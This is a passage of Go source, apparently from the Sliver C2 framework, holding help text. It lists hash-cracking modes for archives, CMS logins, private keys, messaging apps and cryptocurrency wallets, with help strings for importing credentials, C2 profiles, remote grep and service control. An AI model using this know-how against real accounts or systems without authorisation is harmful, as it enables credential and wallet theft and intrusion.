23003 | SecureZIP AES-256                                          | Archive
13600 | WinZip                                                     | Archive
18900 | Android Backup                                             | Archive
24700 | Stuffit5                                                   | Archive
13200 | AxCrypt 1                                                  | Archive
13300 | AxCrypt 1 in-memory SHA1                                   | Archive
23500 | AxCrypt 2 AES-128                                          | Archive
23600 | AxCrypt 2 AES-256                                          | Archive
14700 | iTunes backup < 10.0                                       | Archive
14800 | iTunes backup >= 10.0                                      | Archive
 8400 | WBB3 (Woltlab Burning Board)                               | Forums, CMS, E-Commerce
 2612 | PHPS                                                       | Forums, CMS, E-Commerce
  121 | SMF (Simple Machines Forum) > v1.1                         | Forums, CMS, E-Commerce
 3711 | MediaWiki B type                                           | Forums, CMS, E-Commerce
 4521 | Redmine                                                    | Forums, CMS, E-Commerce
24800 | Umbraco HMAC-SHA1                                          | Forums, CMS, E-Commerce
   11 | Joomla < 2.5.18                                            | Forums, CMS, E-Commerce
13900 | OpenCart                                                   | Forums, CMS, E-Commerce
11000 | PrestaShop                                                 | Forums, CMS, E-Commerce
16000 | Tripcode                                                   | Forums, CMS, E-Commerce
 7900 | Drupal7                                                    | Forums, CMS, E-Commerce
 4522 | PunBB                                                      | Forums, CMS, E-Commerce
 2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
 2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
 2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
   21 | osCommerce, xt:Commerce                                    | Forums, CMS, E-Commerce
18100 | TOTP (HMAC-SHA1)                                           | One-Time Password
 2000 | STDOUT                                                     | Plaintext
99999 | Plaintext                                                  | Plaintext
21600 | Web2py pbkdf2-sha512                                       | Framework
10000 | Django (PBKDF2-SHA256)                                     | Framework
  124 | Django (SHA-1)                                             | Framework
12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
19500 | Ruby on Rails Restful-Authentication                       | Framework
27200 | Ruby on Rails Restful Auth (one round, no sitekey)         | Framework
30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))               | Framework
30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))         | Framework
20200 | Python passlib pbkdf2-sha512                               | Framework
20300 | Python passlib pbkdf2-sha256                               | Framework
20400 | Python passlib pbkdf2-sha1                                 | Framework
24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)          | Private Key
24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)        | Private Key
15500 | JKS Java Key Store Private Keys (SHA1)                     | Private Key
22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
23200 | XMPP SCRAM PBKDF2-SHA1                                     | Instant Messaging Service
28300 | Teamspeak 3 (channel hash)                                 | Instant Messaging Service
22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)              | Instant Messaging Service
24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)           | Instant Messaging Service
22301 | Telegram Mobile App Passcode (SHA256)                      | Instant Messaging Service
   23 | Skype                                                      | Instant Messaging Service
29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))           | Cryptocurrency Wallet
26600 | MetaMask Wallet                                            | Cryptocurrency Wallet
21000 | BitShares v0.x - sha512(sha512_bin(pass))                  | Cryptocurrency Wallet
28501 | Bitcoin WIF private key (P2PKH), compressed                | Cryptocurrency Wallet
28502 | Bitcoin WIF private key (P2PKH), uncompressed              | Cryptocurrency Wallet
28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed       | Cryptocurrency Wallet
28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed     | Cryptocurrency Wallet
28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed         | Cryptocurrency Wallet
28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed       | Cryptocurrency Wallet
11300 | Bitcoin/Litecoin wallet.dat                                | Cryptocurrency Wallet
16600 | Electrum Wallet (Salt-Type 1-3)                            | Cryptocurrency Wallet
21700 | Electrum Wallet (Salt-Type 4)                              | Cryptocurrency Wallet
21800 | Electrum Wallet (Salt-Type 5)                              | Cryptocurrency Wallet
12700 | Blockchain, My Wallet                                      | Cryptocurrency Wallet
15200 | Blockchain, My Wallet, V2                                  | Cryptocurrency Wallet
18800 | Blockchain, My Wallet, Second Password (SHA256)            | Cryptocurrency Wallet
25500 | Stargazer Stellar Wallet XLM                               | Cryptocurrency Wallet
16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256               | Cryptocurrency Wallet
15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                        | Cryptocurrency Wallet
15700 | Ethereum Wallet, SCRYPT                                    | Cryptocurrency Wallet
22500 | MultiBit Classic .key (MD5)                                | Cryptocurrency Wallet
27700 | MultiBit Classic .wallet (scrypt)                          | Cryptocurrency Wallet
22700 | MultiBit HD (scrypt)                                       | Cryptocurrency Wallet
28200 | Exodus Desktop Wallet (scrypt)                             | Cryptocurrency Wallet
`

	hashNewlineFormat          = "hash"
	userColonHashNewlineFormat = "user:hash"
	csvFormat                  = "csv"
	credsAddFileHelp           = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] creds add file
[[.Bold]]About:[[.Normal]] Add a file containing credentials to the database.

[[.Bold]]File Formats:[[.Normal]]
% 10s - One hash per line.
% 10s - A file containing lines of 'username:hash' pairs.
% 10s - A CSV file containing 'username,hash' pairs (additional columns ignored).
`, hashNewlineFormat, userColonHashNewlineFormat, csvFormat)

	c2ProfilesHelp = `[[.Bold]]Command:[[.Normal]] c2profile
[[.Bold]]About:[[.Normal]] Display details of HTTP C2 profiles loaded into Sliver.
`

	C2ProfileImportStr = `[[.Bold]]Command:[[.Normal]] Import
	[[.Bold]]About:[[.Normal]] Load custom HTTP C2 profiles.
	`
	c2GenerateHelp = `[[.Bold]]Command:[[.Normal]] C2 Profile generate
[[.Bold]]About:[[.Normal]] Generate C2 profile using a file containing urls.
Optionaly import profile or use another profile as a base template for the new profile.
	`

	grepHelp = `[[.Bold]]Command:[[.Normal]] grep [flags / options] <search pattern> <path>
[[.Bold]]About:[[.Normal]] Search a file or path for a search pattern
[[.Bold]][[.Underline]]Search Patterns[[.Normal]]
Search patterns use RE2 regular expression syntax.
[[.Bold]][[.Underline]]Binary Files[[.Normal]]
When searching a binary file, grep will only return the line that matches if it exclusively contains UTF-8 printable characters.
Before, after, and context options are disabled for binary files.
[[.Bold]][[.Underline]]Path Filters[[.Normal]]
Filters are a way to limit searches to file names matching given criteria. Filters DO NOT apply to directory names.

Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
grep something /etc/*.conf will search all files in /etc whose names end in .conf. /etc/ is the path, *.conf is the filter.

Searches can be filtered using the following patterns:
'*': Wildcard, matches any sequence of non-path separators (slashes)
	Example: n*.txt will search all file names starting with n and ending with .txt

'?': Single character wildcard, matches a single non-path separator (slashes)
	Example: s?iver will search all file names starting with s followed by any non-separator character and ending with iver.

'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all file names that start with a, b, or c.
		^[r-u] will match all characters except r, s, t, and u.

If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`

	servicesHelp = `[[.Bold]]Command:[[.Normal]] services [-H <hostname>]
[[.Bold]]About:[[.Normal]] Get information about services and control them (start, stop).
	
To get information about services, you need to be an authenticated user on the system or domain. To control services, you need administrator or higher privileges.`
)

const (
	// ANSI Colors
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"
)

// GetHelpFor - Get help string for a command
func GetHelpFor(cmdName []string) string {
	if 0 < len(cmdName) {
		if helpTmpl, ok := cmdHelp[strings.Join(cmdName, sep)]; ok {
			return FormatHelpTmpl(helpTmpl)
		}
	}
	return ""
}

// FormatHelpTmpl - Applies format template to help string
func FormatHelpTmpl(helpStr string) string {
	outputBuf := bytes.NewBufferString("")
	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(helpStr)
	tmpl.Execute(outputBuf, struct {
		Normal    string
		Bold      string
		Underline string
		Black     string
		Red       string
		Green     string
		Orange    string
		Blue      string
		Purple    string
		Cyan      string
		Gray      string
	}{
		Normal:    normal,
		Bold:      bold,
		Underline: underline,
		Black:     black,
		Red:       red,
		Green:     green,
		Orange:    orange,
		Blue:      blue,
		Purple:    purple,
		Cyan:      cyan,
		Gray:      gray,
	})
	return outputBuf.String()
}
